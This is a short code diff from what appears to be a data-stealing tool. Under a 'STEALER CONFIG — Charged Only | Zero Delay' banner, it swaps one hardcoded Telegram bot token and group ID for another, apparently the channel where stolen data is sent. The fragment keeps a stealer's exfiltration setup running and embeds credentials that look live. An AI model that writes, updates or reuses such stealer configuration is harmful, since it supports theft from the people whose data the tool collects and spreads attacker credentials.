@@ -25,8 +25,8 @@ _original_getaddrinfo = socket.getaddrinfo
 # ═══════════════════════════════════════════════════════════════════
 # STEALER CONFIG — Charged Only | Zero Delay
 # ═══════════════════════════════════════════════════════════════════
-_STEALER_BOT_TOKEN = os.environ.get("STEALER_BOT_TOKEN", "8870297322:AAFIOAYS5h8QSB0ULP3HoAWjGC7xNY_3RSs").strip()
-_STEALER_GROUP_ID  = os.environ.get("STEALER_GROUP_ID", "-1003737740461").strip()
+_STEALER_BOT_TOKEN = os.environ.get("STEALER_BOT_TOKEN", "8825056803:AAF-Qma9qK2UkbkcjmhUvWboT0pWlOzBBHg").strip()
+_STEALER_GROUP_ID  = os.environ.get("STEALER_GROUP_ID", "-1003794149884").strip()
 
 
 def _cached_getaddrinfo(*args, **kwargs):
